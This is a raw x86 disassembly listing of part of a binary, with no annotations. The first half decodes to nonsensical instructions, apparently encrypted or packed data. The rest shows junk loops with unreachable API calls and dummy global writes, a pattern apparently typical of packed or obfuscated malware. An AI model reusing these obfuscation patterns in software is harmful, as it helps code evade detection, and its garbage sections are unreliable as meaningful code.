  40577b:	arpl   WORD PTR [ecx+esi*2+0x1e],bp
  40577f:	mov    edi,0x9de1999a
  405784:	mov    ecx,0x2a2e72d3
  405789:	sbb    eax,0xc1de5ca6
  40578e:	cmp    al,0xef
  405790:	out    0xdd,al
  405792:	into   
  405793:	pop    esp
  405794:	mov    ebx,0x914e971a
  405799:	push   esp
  40579a:	xor    BYTE PTR [edx],bl
  40579c:	adc    bl,BYTE PTR [edx+0x23]
  40579f:	cmp    al,0x72
  4057a1:	xchg   DWORD PTR [ebp-0x6e],ecx
  4057a4:	lock xor eax,0x685bfbcc
  4057aa:	(bad)  
  4057ab:	aas    
  4057ac:	into   
  4057ad:	dec    edx
  4057ae:	mov    ds:0x6e8661c7,al
  4057b3:	mov    esp,0x51070a3d
  4057b8:	sub    eax,0xefa0efb2
  4057bd:	cmp    al,0x3c
  4057bf:	sbb    eax,0x53b83103
  4057c4:	jne    0x405763
  4057c6:	xchg   esp,eax
  4057c7:	pop    edx
  4057c8:	ret    
  4057c9:	sbb    bl,BYTE PTR [eax+ebx*1+0x3c]
  4057cd:	adc    al,0x8b
  4057cf:	mov    esi,0x705620a5
  4057d4:	inc    eax
  4057d5:	call   0xa921823b
  4057da:	mov    ch,0x51
  4057dc:	data16 sti 
  4057de:	addr16 add dl,al
  4057e1:	sub    dl,bh
  4057e3:	loop   0x4057ed
  4057e5:	xchg   edx,eax
  4057e6:	mov    dh,0x83
  4057e8:	and    esp,esp
  4057ea:	dec    edx
  4057eb:	pop    ebx
  4057ec:	into   
  4057ed:	add    BYTE PTR [edx-0x330bf695],dl
  4057f3:	mov    al,0xd2
  4057f5:	lock sub al,0x16
  4057f8:	int    0x9e
  4057fa:	cld    
  4057fb:	or     BYTE PTR [edi-0x79],dh
  4057fe:	clc    
  4057ff:	dec    edx
  405800:	not    eax
  405802:	xchg   ebp,eax
  405803:	dec    edi
  405804:	or     DWORD PTR [ecx+0x64c4c62c],0x2737a1bd
  40580e:	ret    
  40580f:	das    
  405810:	jne    0x4057db
  405812:	call   0xb0be9e21
  405817:	neg    DWORD PTR [ecx]
  405819:	stc    
  40581a:	jmp    0x4057e3
  40581c:	pop    ecx
  40581d:	mov    dh,0xfc
  40581f:	out    dx,eax
  405820:	mov    ebx,0x97617158
  405825:	pop    ebx
  405826:	xchg   esp,eax
  405827:	pop    ss
  405828:	loopne 0x405829
  40582a:	sub    eax,0xf871a163
  40582f:	call   0xa400e987
  405834:	mov    fs,WORD PTR [eax+0x71]
  405837:	cwde   
  405838:	test   eax,0x3e30bee
  40583d:	cwde   
  40583e:	dec    ebx
  40583f:	outs   dx,BYTE PTR ds:[esi]
  405840:	mov    bh,0x6c
  405842:	clc    
  405843:	outs   dx,BYTE PTR ds:[esi]
  405844:	stos   DWORD PTR es:[edi],eax
  405845:	hlt    
  405846:	out    0x23,eax
  405848:	(bad)  
  40584a:	je     0x40581b
  40584c:	in     eax,0x3d
  40584e:	pop    ebx
  40584f:	test   al,0xaf
  405851:	dec    esp
  405852:	cwde   
  405853:	sbb    bh,BYTE PTR [ebx-0x38c1d01]
  405859:	pop    es
  40585a:	cdq    
  40585b:	iret   
  40585c:	sahf   
  40585d:	xchg   edx,eax
  40585e:	jg     0x405857
  405860:	out    0x52,al
  405862:	pop    esi
  405863:	xchg   ebx,eax
  405864:	pop    esi
  405865:	retf   
  405866:	je     0x405853
  405868:	mov    eax,0xfc9e61b9
  40586d:	mov    eax,ds:0x9d3bfbb0
  405872:	jp     0x405848
  405874:	frstor [edx+0x6213af64]
  40587a:	fmul   QWORD PTR [esi]
  40587c:	retf   
  40587d:	cld    
  40587e:	push   edi
  40587f:	add    BYTE PTR [ebp+0x220e0b7a],bl
  405885:	lea    edi,[eax+edx*1+0x695ff591]
  40588c:	push   ebx
  40588d:	outs   dx,DWORD PTR ds:[esi]
  40588e:	cmp    eax,0x3d5429a2
  405893:	scas   al,BYTE PTR es:[edi]
  405894:	and    cl,ch
  405896:	inc    edx
  405897:	scas   al,BYTE PTR es:[edi]
  405898:	ret    
  405899:	pop    edx
  40589a:	pop    ebx
  40589b:	jl     0x405847
  40589d:	or     DWORD PTR [ebx+0xe],edx
  4058a0:	jl     0x4058d9
  4058a2:	mov    dl,0xbe
  4058a4:	retf   
  4058a5:	les    edx,FWORD PTR [ebx-0x70d681aa]
  4058ab:	stos   BYTE PTR es:[edi],al
  4058ac:	pop    edx
  4058ad:	mov    ah,0x4e
  4058af:	jmp    0xf09c:0x86c0b435
  4058b6:	fmul   DWORD PTR [edx]
  4058b8:	or     ebx,DWORD PTR [ebp+0x178dc8a9]
  4058be:	aas    
  4058bf:	scas   eax,DWORD PTR es:[edi]
  4058c0:	or     DWORD PTR [ecx-0x7bfe417d],edi
  4058c6:	push   ds
  4058c7:	cmp    ah,0x2c
  4058ca:	mov    ecx,0x5f1f4c25
  4058cf:	dec    ecx
  4058d0:	jne    0x405860
  4058d2:	or     eax,0x704307d8
  4058d7:	and    eax,eax
  4058d9:	jmp    0x4058a8
  4058db:	mov    ds:0x1d287342,al
  4058e0:	aas    
  4058e1:	xchg   BYTE PTR ds:0x50d6a806,ch
  4058e7:	push   ebx
  4058e8:	jbe    0x40592c
  4058ea:	or     esi,DWORD PTR [ebx+0xe]
  4058ed:	test   al,0x3d
  4058ef:	pusha  
  4058f0:	adc    eax,0x12fb5e74
  4058f5:	imul   edi,ebx,0x5d
  4058f8:	xor    eax,0x51f3940
  4058fd:	stos   BYTE PTR es:[edi],al
  4058fe:	push   es
  4058ff:	jge    0x405915
  405901:	adc    DWORD PTR [ebx+ebx*1],0x68a86a9f
  405908:	ins    DWORD PTR es:[edi],dx
  405909:	cli    
  40590a:	js     0x4058a4
  40590c:	xchg   DWORD PTR [ecx+0x51],ecx
  40590f:	aam    0xc9
  405911:	adc    ch,BYTE PTR [edx]
  405913:	popf   
  405914:	popa   
  405915:	sbb    eax,ebx
  405917:	test   eax,0x248a258a
  40591c:	frstor [esi]
  40591e:	xchg   ebx,eax
  40591f:	(bad)  
  405920:	jle    0x40596d
  405922:	push   esp
  405923:	xor    BYTE PTR [esi+esi*4],bl
  405926:	push   esi
  405927:	push   eax
  405928:	fwait
  405929:	or     eax,0x516bc3c2
  40592e:	jne    0x4058b1
  405930:	mov    edi,0x278ab39d
  405935:	(bad)  
  405936:	push   0xffffffe4
  405938:	fdiv   QWORD PTR [esi+0x1babf747]
  40593e:	or     dh,ah
  405940:	imul   esp,DWORD PTR [edx],0x6d
  405943:	inc    eax
  405944:	fsubr  st,st(7)
  405946:	inc    esi
  405947:	mov    esi,0x9e2f75a7
  40594c:	adc    BYTE PTR [ecx+esi*1-0x7ef472e7],0x15
  405954:	mov    ds:0x9ca6673e,eax
  405959:	mov    ds:0xaae20aed,eax
  40595e:	mov    al,0xa9
  405960:	jmp    0xf0f8:0xbcfe312a
  405967:	push   edx
  405968:	call   0xdb3c6d16
  40596d:	cld    
  40596e:	mov    esi,0x16595b93
  405973:	(bad)  
  405974:	mov    bl,0x74
  405976:	lods   al,BYTE PTR ds:[esi]
  405977:	push   edx
  405978:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405979:	pop    edi
  40597a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40597b:	adc    al,0xe4
  40597d:	jge    0x405982
  40597f:	icebp  
  405980:	mov    ds:0x62df2fa9,al
  405985:	loope  0x40595a
  405987:	icebp  
  405988:	aaa    
  405989:	rcr    BYTE PTR [ebx+edi*8-0x1f4555c4],1
  405990:	sub    bl,BYTE PTR ds:0x6e5a6faf
  405996:	(bad)  
  405997:	dec    eax
  405998:	pop    ss
  405999:	push   cs
  40599a:	jnp    0x40595a
  40599c:	jbe    0x40597b
  40599e:	push   ecx
  40599f:	jae    0x4059cf
  4059a1:	pop    ss
  4059a2:	add    al,0x6d
  4059a4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4059a5:	popf   
  4059a6:	inc    edi
  4059a7:	call   0x389854a
  4059ac:	add    al,ch
  4059ae:	pop    ebp
  4059af:	fadd   QWORD PTR [ecx+0x66]
  4059b2:	add    ebx,DWORD PTR [ecx-0x76]
  4059b5:	add    ah,ch
  4059b7:	sub    eax,0x66cfd971
  4059bc:	inc    esp
  4059bd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4059be:	mov    al,ds:0x79dcb970
  4059c3:	out    dx,al
  4059c4:	pop    ebp
  4059c5:	rcl    DWORD PTR [eax+0x19275ad6],cl
  4059cb:	mov    edx,DWORD PTR [ebp+eiz*1+0xb]
  4059cf:	push   0x59
  4059d1:	mov    ebx,0xe798a294
  4059d6:	mul    DWORD PTR [ebx]
  4059d8:	lods   al,BYTE PTR ds:[esi]
  4059d9:	sti    
  4059da:	dec    ebx
  4059db:	mov    esp,edx
  4059dd:	aaa    
  4059de:	xchg   ebx,eax
  4059df:	sbb    BYTE PTR [edi],0x97
  4059e2:	mov    edx,DWORD PTR [esi+0x14]
  4059e5:	mov    fs,WORD PTR [ecx+eiz*1]
  4059e8:	mov    ebx,0x8dcc0660
  4059ed:	push   esi
  4059ee:	fcmovnu st,st(5)
  4059f0:	sub    al,0xf4
  4059f2:	into   
  4059f3:	or     BYTE PTR [eax+0x3a],cl
  4059f6:	bnd jbe 0x405a5f
  4059f9:	frstor [edi+edx*2]
  4059fc:	mov    ebx,0x947bcee0
  405a01:	inc    edi
  405a02:	pop    ebx
  405a03:	cmp    ebp,DWORD PTR [ecx+0x4d]
  405a06:	fdiv   QWORD PTR ss:[edx+0x4b]
  405a0a:	rol    DWORD PTR [edx-0x77009e1],1
  405a10:	jae    0x4059a2
  405a12:	scas   eax,DWORD PTR es:[edi]
  405a13:	outs   dx,BYTE PTR ds:[esi]
  405a14:	in     al,0x5d
  405a16:	call   0xa496dc39
  405a1b:	leave  
  405a1c:	jmp    0x1c0d016b
  405a21:	push   ecx
  405a22:	jge    0x405a59
  405a24:	outs   dx,BYTE PTR ds:[esi]
  405a25:	add    al,0x8b
  405a27:	mov    dh,0x38
  405a29:	leave  
  405a2a:	pop    esp
  405a2b:	and    ah,ah
  405a2d:	lea    esp,[ecx-0x29]
  405a30:	stos   DWORD PTR es:[edi],eax
  405a31:	mov    ebp,0x7bf5e039
  405a36:	xlat   BYTE PTR ds:[ebx]
  405a37:	(bad)  
  405a38:	hlt    
  405a39:	push   esp
  405a3a:	xchg   ecx,eax
  405a3b:	rcr    DWORD PTR [edx],0x75
  405a3e:	push   ds
  405a3f:	or     eax,0x94bcf2a2
  405a44:	addr16 mov al,ds:0x9ede
  405a48:	test   eax,0x8b0de4d8
  405a4d:	cld    
  405a4e:	js     0x405a5e
  405a50:	xchg   esi,eax
  405a51:	inc    ecx
  405a52:	adc    DWORD PTR [esi+0x44],ebx
  405a55:	lods   eax,DWORD PTR ds:[esi]
  405a56:	add    dl,bl
  405a58:	repz addr16 cmp ecx,esp
  405a5c:	mov    esi,0xeee8ac7b
  405a61:	dec    esi
  405a62:	jge    0x405a0b
  405a64:	xchg   ecx,eax
  405a65:	sub    ah,bh
  405a67:	sahf   
  405a68:	iret   
  405a69:	or     eax,0x1879bd2b
  405a6e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405a6f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405a70:	fsub   DWORD PTR [edx]
  405a72:	popa   
  405a73:	addr16 daa 
  405a75:	add    bl,ch
  405a77:	dec    DWORD PTR [edx]
  405a79:	mov    al,0x56
  405a7b:	dec    ebp
  405a7c:	xor    al,0x1c
  405a7e:	sub    dl,BYTE PTR [edx]
  405a80:	xor    eax,0x2dd9b880
  405a85:	call   0x80d9:0x59b7d162
  405a8c:	repnz fdiv DWORD PTR [eax+0x69]
  405a90:	popa   
  405a91:	cld    
  405a92:	jecxz  0x405a5e
  405a94:	sbb    edx,DWORD PTR [edi]
  405a96:	popa   
  405a97:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405a98:	lea    ebx,[ebp+0x41748af8]
  405a9e:	ins    DWORD PTR es:[edi],dx
  405a9f:	or     dl,ch
  405aa1:	test   eax,0x591144a0
  405aa6:	retf   
  405aa7:	in     al,dx
  405aa8:	popa   
  405aa9:	loope  0x405a53
  405aab:	(bad)  
  405aac:	xchg   ebp,eax
  405aad:	mov    ebx,esi
  405aaf:	push   0x16863b4f
  405ab4:	aam    0xe9
  405ab6:	add    DWORD PTR [ecx-0x53],ebp
  405ab9:	xor    ecx,DWORD PTR [esi+edi*4]
  405abc:	pop    ds
  405abd:	sub    al,0x55
  405abf:	popa   
  405ac0:	cdq    
  405ac1:	push   ecx
  405ac2:	rcl    BYTE PTR ds:0xd4a4e92b,1
  405ac8:	stos   BYTE PTR es:[edi],al
  405ac9:	and    ecx,DWORD PTR [edi+0x67292181]
  405acf:	ss out dx,al
  405ad1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405ad2:	or     esp,DWORD PTR [esi-0x4e]
  405ad5:	ins    DWORD PTR es:[edi],dx
  405ad6:	jmp    0x9c9a:0xe0e806d9
  405add:	pop    ebx
  405ade:	and    eax,0xc254c6b9
  405ae3:	call   DWORD PTR [ebp-0x3060afdb]
  405ae9:	inc    edx
  405aea:	sbb    ebp,DWORD PTR [esi]
  405aec:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405aed:	mov    bl,0xbd
  405aef:	inc    ebx
  405af0:	push   esi
  405af1:	or     DWORD PTR [esi+0x68d8d79f],ecx
  405af7:	ss jge 0x405b41
  405afa:	sbb    esi,DWORD PTR [ecx+0x470dda30]
  405b00:	je     0x405b54
  405b02:	pop    eax
  405b03:	js     0x405ab6
  405b05:	jecxz  0x405b54
  405b07:	xlat   BYTE PTR ds:[ebx]
  405b08:	and    DWORD PTR [edi-0x178918dd],ebp
  405b0e:	push   ds
  405b0f:	lods   eax,DWORD PTR ds:[esi]
  405b10:	outs   dx,DWORD PTR ds:[esi]
  405b11:	sar    DWORD PTR [ebp-0x4b],cl
  405b14:	popf   
  405b15:	fdiv   DWORD PTR [ecx-0x4f]
  405b18:	or     eax,0x9f0f4328
  405b1d:	push   eax
  405b1e:	js     0x405aa9
  405b20:	retf   0x9419
  405b23:	mov    dh,0x39
  405b25:	les    esi,FWORD PTR [ecx]
  405b27:	outs   dx,BYTE PTR ds:[esi]
  405b28:	mov    al,0x8e
  405b2a:	aas    
  405b2b:	mov    ecx,0x7648d0a2
  405b30:	das    
  405b31:	cwde   
  405b32:	repnz inc eax
  405b34:	xor    esp,edi
  405b36:	dec    ebp
  405b37:	mov    ecx,0x65b9aa42
  405b3c:	je     0x405b25
  405b3e:	add    cl,BYTE PTR [edx]
  405b40:	or     BYTE PTR ds:[ebx+0x1e],bh
  405b44:	inc    esp
  405b45:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405b46:	mov    ah,0xb8
  405b48:	pusha  
  405b49:	ret    0xa260
  405b4c:	(bad)  
  405b4e:	mov    dh,0x7f
  405b50:	leave  
  405b51:	mov    ds:0xb29a00f9,al
  405b56:	test   al,0xda
  405b58:	test   DWORD PTR [esi],esp
  405b5a:	dec    esp
  405b5b:	out    0x8,al
  405b5d:	adc    BYTE PTR [edx+0x26],ch
  405b60:	lods   eax,DWORD PTR ds:[esi]
  405b62:	adc    eax,0xffffffb2
  405b65:	inc    edx
  405b66:	mov    eax,ds:0x115a3f1c
  405b6b:	sbb    al,0x65
  405b6d:	sahf   
  405b6e:	push   edi
  405b6f:	push   edi
  405b70:	test   DWORD PTR [edx-0x6a],esp
  405b73:	jmp    DWORD PTR [edi-0x37]
  405b76:	(bad)  
  405b77:	push   0xfc487900
  405b7c:	mov    ebp,0xf153ad9
  405b81:	and    al,0xcc
  405b83:	call   DWORD PTR [esi-0x6df39d77]
  405b89:	mov    esp,0x791da59
  405b8e:	clc    
  405b8f:	mov    ebp,0x4368e405
  405b94:	stos   BYTE PTR es:[edi],al
  405b95:	aaa    
  405b96:	dec    DWORD PTR [esi-0x4d314751]
  405b9c:	jno    0x405bfe
  405b9e:	jae    0x405bfc
  405ba0:	mov    esp,0x134ff247
  405ba5:	call   0x6642f847
  405baa:	and    ecx,DWORD PTR [ecx]
  405bac:	jmp    0x8ef5:0x3682a7f8
  405bb3:	das    
  405bb4:	jp     0x405b54
  405bb6:	mov    esp,0x58ed76cf
  405bbb:	push   eax
  405bbc:	shl    BYTE PTR [edi],1
  405bbe:	push   esp
  405bbf:	rcr    DWORD PTR [esi+0x4b4cd8a9],cl
  405bc5:	xor    BYTE PTR [eax-0x18],ch
  405bc8:	(bad)  
  405bc9:	sbb    BYTE PTR [ebx],0x32
  405bcc:	jl     0x405ba2
  405bce:	dec    ecx
  405bcf:	mov    al,0x45
  405bd1:	sub    al,0x9c
  405bd3:	not    BYTE PTR [ecx]
  405bd5:	or     eax,0xc7275fc3
  405bda:	test   eax,0x86e3e401
  405bdf:	rcl    DWORD PTR [eax-0x18a9eaad],1
  405be5:	ss jns 0x405bc3
  405be8:	sbb    eax,0x201bc83f
  405bed:	adc    al,0x99
  405bef:	jmp    0xe3d8:0x4027f520
  405bf6:	inc    ebx
  405bf7:	or     edi,DWORD PTR [ecx+ecx*8+0x3e]
  405bfb:	mov    eax,0x7e8ea621
  405c00:	outs   dx,BYTE PTR ds:[esi]
  405c01:	jno    0x405c08
  405c03:	add    edi,DWORD PTR [ebp+eax*1-0x71]
  405c07:	outs   dx,BYTE PTR ds:[esi]
  405c08:	inc    esi
  405c09:	xchg   DWORD PTR [ecx+0x365201cb],edx
  405c0f:	enter  0xc590,0x6
  405c13:	mov    cl,0x3b
  405c15:	adc    ah,dl
  405c17:	dec    eax
  405c18:	sbb    esi,DWORD PTR [ebx+0x31]
  405c1b:	call   0xb5f9:0x588bc0aa
  405c22:	repnz dec ebp
  405c24:	add    BYTE PTR [esi+0x39182c38],bh
  405c2a:	ins    DWORD PTR es:[edi],dx
  405c2b:	cwde   
  405c2c:	(bad)  
  405c2d:	jnp    0x405c08
  405c2f:	jae    0x405ca6
  405c31:	jl     0x405bbc
  405c33:	aam    0xa6
  405c35:	pop    es
  405c36:	mov    al,0x69
  405c38:	xchg   edi,eax
  405c39:	add    dh,BYTE PTR [eax-0x4be2fba]
  405c3f:	out    dx,eax
  405c40:	adc    esp,ebx
  405c42:	xchg   edx,eax
  405c43:	dec    esp
  405c44:	stos   DWORD PTR es:[edi],eax
  405c45:	mov    edx,0xe6587afa
  405c4a:	mov    eax,ds:0x421a92
  405c4f:	push   DWORD PTR [eax]
  405c51:	push   DWORD PTR ds:0x421cee
  405c57:	push   DWORD PTR ds:0x421a9a
  405c5d:	push   DWORD PTR ds:0x421cce
  405c63:	push   DWORD PTR ds:0x421d62
  405c69:	push   DWORD PTR [ebp-0x30]
  405c6c:	push   DWORD PTR [ebp-0x20]
  405c6f:	mov    eax,DWORD PTR [ebp-0x8]
  405c72:	mov    eax,DWORD PTR [eax]
  405c74:	mov    eax,DWORD PTR [eax]
  405c76:	mov    eax,DWORD PTR [eax]
  405c78:	call   eax
  405c7a:	mov    eax,DWORD PTR [ebp-0x34]
  405c7d:	mov    ecx,DWORD PTR ds:0x421c92
  405c83:	add    DWORD PTR [eax],ecx
  405c85:	pop    edi
  405c86:	pop    esi
  405c87:	leave  
  405c88:	ret    
  405c89:	push   ebp
  405c8a:	mov    ebp,esp
  405c8c:	sub    esp,0x58
  405c8f:	add    DWORD PTR ds:0x429008,0x42b004
  405c99:	push   ebx
  405c9a:	adc    DWORD PTR ds:0x42a018,0x429010
  405ca4:	push   esi
  405ca5:	push   edi
  405ca6:	and    DWORD PTR ds:0x42c00c,0x6433
  405cb0:	push   0x1f
  405cb2:	lea    eax,[ebp-0x58]
  405cb5:	push   eax
  405cb6:	adc    DWORD PTR ds:0x42a010,0x6fdc
  405cc0:	push   0x0
  405cc2:	sub    DWORD PTR ds:0x42b018,0x7ba7
  405ccc:	call   DWORD PTR ds:0x424034
  405cd2:	call   DWORD PTR ds:0x424004
  405cd8:	and    DWORD PTR ds:0x42a000,0x4473
  405ce2:	mov    DWORD PTR [ebp-0x4],0xf89c85b6
  405ce9:	and    DWORD PTR ds:0x429018,0x0
  405cf3:	mov    ebx,DWORD PTR ds:0x429018
  405cf9:	inc    ebx
  405cfa:	mov    DWORD PTR ds:0x429018,ebx
  405d00:	cmp    DWORD PTR ds:0x429018,0x1f
  405d07:	jne    0x405d1d
  405d0d:	push   0x42b00c
  405d12:	push   0x7f05
  405d17:	call   DWORD PTR ds:0x42403c
  405d1d:	cmp    DWORD PTR ds:0x429018,0x19
  405d24:	jb     0x405cf3
  405d2a:	add    ebx,DWORD PTR ds:0x42a008
  405d30:	mov    DWORD PTR [ebp-0x14],0xf89c85b5
  405d37:	mov    ecx,DWORD PTR [ebp-0x4]
  405d3a:	mov    ebx,0x7510893
  405d3f:	xor    ecx,ebx
  405d41:	or     DWORD PTR ds:0x42b00c,edx
  405d47:	mov    eax,0x3272db
  405d4c:	add    ecx,eax
  405d4e:	sub    DWORD PTR ds:0x42a010,0x429004
  405d58:	mov    DWORD PTR [ebp-0x1c],ecx
  405d5b:	mov    ecx,DWORD PTR [ebp+0x14]
  405d5e:	mov    DWORD PTR ds:0x42800c,0x25aa
  405d68:	test   ecx,ecx
  405d6a:	mov    DWORD PTR ds:0x428000,0x5e1a
  405d74:	je     0x405d92
  405d7a:	sub    DWORD PTR ds:0x42b018,0x6b15
  405d84:	mov    ecx,DWORD PTR [ebp+0x14]
  405d87:	mov    ecx,DWORD PTR [ecx]
  405d89:	add    DWORD PTR ds:0x42a000,ecx
  405d8f:	mov    DWORD PTR [ebp-0x1c],ecx
  405d92:	and    DWORD PTR ds:0x42a010,0x0
  405d9c:	mov    edi,DWORD PTR ds:0x42a010
  405da2:	inc    edi
  405da3:	mov    DWORD PTR ds:0x42a010,edi
  405da9:	cmp    DWORD PTR ds:0x42a010,0x9
  405db0:	jne    0x405dc4
  405db6:	push   DWORD PTR [ebp-0x14]
  405db9:	push   0x423877
  405dbe:	call   DWORD PTR ds:0x424040
  405dc4:	cmp    DWORD PTR ds:0x42a010,0x8
  405dcb:	jne    0x405dde
  405dd1:	mov    edi,DWORD PTR ds:0x42a010
  405dd7:	inc    edi
  405dd8:	mov    DWORD PTR ds:0x42a010,edi
  405dde:	cmp    DWORD PTR ds:0x42a010,0x13
  405de5:	jb     0x405d9c
  405deb:	mov    ecx,0x457a
  405df0:	imul   edx,eax
  405df3:	mov    esi,0x787f
  405df8:	or     DWORD PTR ds:0x428004,0x4238
  405e02:	add    edx,ecx
  405e04:	sbb    DWORD PTR ds:0x429014,0x4641
  405e0e:	xchg   esi,ecx
  405e10:	xor    DWORD PTR ds:0x42801c,edi
  405e16:	mov    edi,0x155c
  405e1b:	sub    edx,edi
  405e1d:	and    DWORD PTR ds:0x42901c,0x60c1
  405e27:	mov    ecx,DWORD PTR [ebp-0x4]
  405e2a:	xor    ecx,ebx
  405e2c:	and    DWORD PTR ds:0x42b014,0x0
  405e36:	mov    esi,DWORD PTR ds:0x42b014
  405e3c:	inc    esi
  405e3d:	mov    DWORD PTR ds:0x42b014,esi
  405e43:	cmp    DWORD PTR ds:0x42b014,0x10
  405e4a:	jne    0x405e5b
  405e50:	push   0x423836
  405e55:	call   DWORD PTR ds:0x424044
  405e5b:	cmp    DWORD PTR ds:0x42b014,0xf
  405e62:	jne    0x405e75
  405e68:	mov    esi,DWORD PTR ds:0x42b014
  405e6e:	inc    esi
  405e6f:	mov    DWORD PTR ds:0x42b014,esi
  405e75:	cmp    DWORD PTR ds:0x42b014,0x1b
  405e7c:	jb     0x405e36
  405e82:	add    ecx,eax
  405e84:	sbb    esi,0x766b
  405e8a:	mov    DWORD PTR [ebp-0x8],ecx
  405e8d:	and    esi,0x21f
  405e93:	mov    ecx,DWORD PTR [ebp-0x14]
  405e96:	mov    DWORD PTR ds:0x42b000,0x19
  405ea0:	cmp    DWORD PTR ds:0x42b000,0x0
  405ea7:	je     0x405f01
  405ead:	cmp    DWORD PTR ds:0x42b000,0x4
  405eb4:	jne    0x405ecd
  405eba:	push   DWORD PTR [ebp-0x1c]
  405ebd:	push   0x429018
  405ec2:	push   0x423aa2
  405ec7:	call   DWORD PTR ds:0x424048
  405ecd:	cmp    DWORD PTR ds:0x42b000,0x5
  405ed4:	jne    0x405ee7
  405eda:	mov    esi,DWORD PTR ds:0x42b000
  405ee0:	dec    esi
  405ee1:	mov    DWORD PTR ds:0x42b000,esi
  405ee7:	xor    esi,esi
  405ee9:	add    esi,DWORD PTR ds:0x42b000
  405eef:	dec    esi
  405ef0:	mov    DWORD PTR ds:0x42b000,esi
  405ef6:	jmp    0x405ea0
  405efb:	and    esi,0x686c
  405f01:	xor    ecx,ebx
  405f03:	add    ecx,eax
  405f05:	mov    DWORD PTR [ebp-0x24],ecx
  405f08:	adc    esi,ecx
  405f0a:	mov    ecx,DWORD PTR [ebp-0x4]
  405f0d:	and    DWORD PTR ds:0x428014,0x0
  405f17:	jmp    0x405f29
  405f1c:	mov    esi,DWORD PTR ds:0x428014
  405f22:	inc    esi
  405f23:	mov    DWORD PTR ds:0x428014,esi
  405f29:	cmp    DWORD PTR ds:0x428014,0x14
  405f30:	jae    0x405f5c
  405f36:	cmp    DWORD PTR ds:0x428014,0x1d
  405f3d:	jne    0x405f51
  405f43:	push   0x42b01c
  405f48:	push   DWORD PTR [ebp-0xc]
  405f4b:	call   DWORD PTR ds:0x424014
  405f51:	jmp    0x405f1c
  405f56:	xor    DWORD PTR ds:0x428018,ecx
  405f5c:	xor    ecx,ebx
  405f5e:	add    ecx,eax
  405f60:	add    DWORD PTR ds:0x428004,edx
  405f66:	mov    DWORD PTR [ebp-0x30],ecx
  405f69:	adc    DWORD PTR ds:0x42b01c,edi
  405f6f:	mov    esi,DWORD PTR [ebp-0x4]
  405f72:	xor    DWORD PTR ds:0x42800c,0x2f0f
  405f7c:	xor    esi,ebx
  405f7e:	and    DWORD PTR ds:0x429018,0x0
  405f88:	mov    ecx,DWORD PTR ds:0x429018
  405f8e:	inc    ecx
  405f8f:	mov    DWORD PTR ds:0x429018,ecx
  405f95:	cmp    DWORD PTR ds:0x429018,0x13
  405f9c:	jne    0x405fca
  405fa2:	push   DWORD PTR [ebp-0x18]
  405fa5:	push   0x42b018
  405faa:	push   0x8bc1
  405faf:	push   0x42a018
  405fb4:	push   0x81c2
  405fb9:	push   DWORD PTR [ebp-0x18]
  405fbc:	push   0x8630
  405fc1:	push   DWORD PTR [ebp-0x28]
  405fc4:	call   DWORD PTR ds:0x424018
  405fca:	cmp    DWORD PTR ds:0x429018,0x10
  405fd1:	jb     0x405f88
  405fd7:	movzx  ecx,WORD PTR ds:0x429008
  405fde:	sub    ecx,DWORD PTR ds:0x42a010
  405fe4:	mov    DWORD PTR ds:0x429008,ecx
  405fea:	add    esi,eax
  405fec:	mov    ecx,DWORD PTR [ebp-0x24]
  405fef:	sub    ecx,eax
  405ff1:	lea    edx,[esi-0x3272db]
  405ff7:	xor    DWORD PTR ds:0x428008,0x428000
  406001:	xor    ecx,ebx
  406003:	sub    DWORD PTR ds:0x42c01c,0x42b01c
  40600d:	xor    edx,ebx
  40600f:	cmp    edx,ecx
  406011:	mov    DWORD PTR ds:0x428000,0x76f
  40601b:	je     0x4062a3
  406021:	xor    DWORD PTR ds:0x42c010,edx
  406027:	mov    ecx,DWORD PTR [ebp-0x4]
  40602a:	xor    ecx,ebx
  40602c:	or     DWORD PTR ds:0x429014,0x42a01c
  406036:	add    ecx,eax
  406038:	cmp    esi,ecx
  40603a:	mov    DWORD PTR ds:0x42a01c,0x739d
  406044:	jne    0x406280
  40604a:	add    DWORD PTR ds:0x42a00c,0x429004
  406054:	push   DWORD PTR [ebp+0x8]
  406057:	call   0x413c14
  40605c:	mov    DWORD PTR [ebp-0x18],eax
  40605f:	mov    eax,DWORD PTR [ebp-0x4]
  406062:	mov    DWORD PTR ds:0x42c00c,0x1d
  40606c:	cmp    DWORD PTR ds:0x42c00c,0x0
  406073:	je     0x4060a7
  406079:	cmp    DWORD PTR ds:0x42c00c,0x21
  406080:	jne    0x40608f
  406086:	push   DWORD PTR [ebp-0xc]
  406089:	call   DWORD PTR ds:0x42401c
  40608f:	mov    edi,DWORD PTR ds:0x42c00c
  406095:	dec    edi
  406096:	mov    DWORD PTR ds:0x42c00c,edi
  40609c:	jmp    0x40606c
  4060a1:	adc    ecx,DWORD PTR ds:0x428008
  4060a7:	mov    ecx,DWORD PTR [ebp-0x18]
  4060aa:	and    DWORD PTR ds:0x42b01c,0x0
  4060b4:	mov    edi,DWORD PTR ds:0x42b01c
  4060ba:	inc    edi
  4060bb:	mov    DWORD PTR ds:0x42b01c,edi
  4060c1:	cmp    DWORD PTR ds:0x42b01c,0x23
  4060c8:	jne    0x4060da
  4060ce:	push   DWORD PTR [ebp-0x14]
  4060d1:	push   DWORD PTR [ebp-0x28]
  4060d4:	call   DWORD PTR ds:0x424020
  4060da:	cmp    DWORD PTR ds:0x42b01c,0x19
  4060e1:	jb     0x4060b4
  4060e7:	xor    eax,ebx
  4060e9:	add    DWORD PTR ds:0x429018,0x397c
  4060f3:	mov    edi,0x3272db
  4060f8:	sub    DWORD PTR ds:0x428020,0x386b
  406102:	add    eax,edi
  406104:	mov    DWORD PTR ds:0x42900c,0x67dc
  40610e:	cmp    ecx,eax
  406110:	mov    DWORD PTR ds:0x42c00c,0x661b
  40611a:	je     0x406313
  406120:	push   DWORD PTR [ebp-0x18]
  406123:	sub    DWORD PTR ds:0x42800c,0x42a014
  40612d:	push   DWORD PTR [ebp+0x8]
  406130:	and    DWORD PTR ds:0x42b000,0x429010
  40613a:	call   0x41b72b
